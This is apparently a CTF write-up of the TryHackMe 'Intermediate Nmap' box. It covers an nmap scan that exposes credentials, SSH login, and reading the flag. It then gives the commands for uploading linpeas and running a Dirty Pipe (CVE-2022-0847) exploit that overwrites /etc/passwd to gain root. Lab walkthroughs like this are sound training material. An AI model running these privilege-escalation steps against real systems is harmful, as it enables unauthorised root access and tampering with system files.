# write-up - Intermediate-Nmap
The website tryhackme is a ctf website. It proposes us some boxes to attack and to get flag out of it.

The challenge called Intermediate Nmap is an easy and short challenge (can be done in less than five minute) but we can still learn from it.

In this write up I am gonna go further and get the PE to root.

## Scanning
The scanning will be done with nmap (yes 4 real).

The parameters of nmap will be
```
-A -p- <ip>
```
-A = scan all the versions, will be very help full

-p-= try all the ports (why u may ask, “is listening in the high port” the box says)

Here is the output of this command

![image](https://user-images.githubusercontent.com/48420953/191597272-b581d8a9-5a44-4dcd-8cc4-1900b8e0d8ee.png)

We can already see a user and a password. (Have I already told u, it is an easy and short box).

We can also see that the ssh is the only opened port and X11 belongs to ssh(graphical)

## Connect into the machine

Let’s try to connect to the machine with ssh
```
ssh ubuntu@10.10.29.157 -p 22
```
The pw is required

And we are in

![image](https://user-images.githubusercontent.com/48420953/191597765-9d037880-2fc7-4bc4-8de2-a77cba9e0786.png)

## Finding the Flag

So now, let’s go to the / of the machine and let’s find where the flag is.
```
cd
```
We can go in the home dir and ls to see all the users.
```
cd home
ls
```

it will return us this

![image](https://user-images.githubusercontent.com/48420953/191598281-bcc0953e-b28d-42e6-aaf5-f0b2eb8694e8.png)

Let’s go in user and ls, we will find flag.txt, let’s cat it

![image](https://user-images.githubusercontent.com/48420953/191598440-9cf136b1-2838-4a8c-8b8a-e80d1f9ca8f0.png)

And we have the working flag.

But this challenge is so short that I need at least to get the PE.

## Getting the PE

We gonna scp [linpeas](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh) in the ubuntu’s user dir.

```
scp linpeas.sh ubuntu@<ip>:/home/ubuntu
```

It is done, get back in the ubuntu dir
```
cd /home/ubuntu
```

Give the execution properties to the linpeas script
```
chmod +x linpeas.sh
```

and execute the script

```
./linpeas.sh
```

We can already see a CVE

![image](https://user-images.githubusercontent.com/48420953/191599448-22e10f01-3244-48c6-a03f-cf5556b46628.png)

The [CVE-2022-0847](https://github.com/Al1ex/CVE-2022-0847) is a PE CVE

We just have to compilate the c script and execute it in the machine.

First we scp the script in the ubuntu's dir.

```
scp CVE-2022-0847.c ubuntu@<ip>:/home/ubuntu
```

In the Machine, we must compilate it
```
gcc CVE-2022-0847.c -o cve
```

Now let's execute it
```
./cve /etc/passwd 1 ootz:
```

we just need to switch user to rootz and we are good
```
su rootz
whoami
```

here is the proof

![image](https://user-images.githubusercontent.com/48420953/191600373-d994a7e4-a497-4463-b0c3-097bfb479281.png)
